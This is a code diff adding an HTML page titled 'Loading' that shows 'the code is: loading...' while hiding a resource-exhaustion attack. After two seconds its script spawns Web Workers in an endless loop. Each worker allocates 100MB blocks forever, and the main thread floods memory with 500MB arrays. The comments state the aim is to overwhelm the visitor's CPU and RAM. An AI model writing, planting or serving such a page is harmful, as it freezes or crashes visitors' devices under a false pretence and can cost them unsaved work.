@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading</title>
+</head>
+<body style="background:#000; color:#fff;">
+    <h1>the code is: loading...</h1>
+    
+    <script id="worker-code" type="javascript/worker">
+        // The worker script that will replicate itself and consume RAM
+        self.onmessage = function() {
+            const block = [];
+            while(true) {
+                block.push(new ArrayBuffer(100000000)); // Allocate 100MB repeatedly
+            }
+        };
+    </script>
+
+    <script>
+        setTimeout(() => {
+            // Create a blob from the worker code above
+            const blob = new Blob([document.getElementById('worker-code').textContent], {type: 'text/javascript'});
+            const workerUrl = URL.createObjectURL(blob);
+
+            // Infinite loop to spawn workers and overwhelm the CPU/RAM
+            while (true) {
+                try {
+                    const worker = new Worker(workerUrl);
+                    worker.postMessage('go');
+                    
+                    // Also flood the main thread's memory heap simultaneously
+                    const crashData = new Uint8Array(1024 * 1024 * 500); // 500MB chunks
+                    console.log(window.crypto.getRandomValues(crashData));
+                } catch(e) {
+                    // Even if it catches an error, it keeps trying to spawn
+                }
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
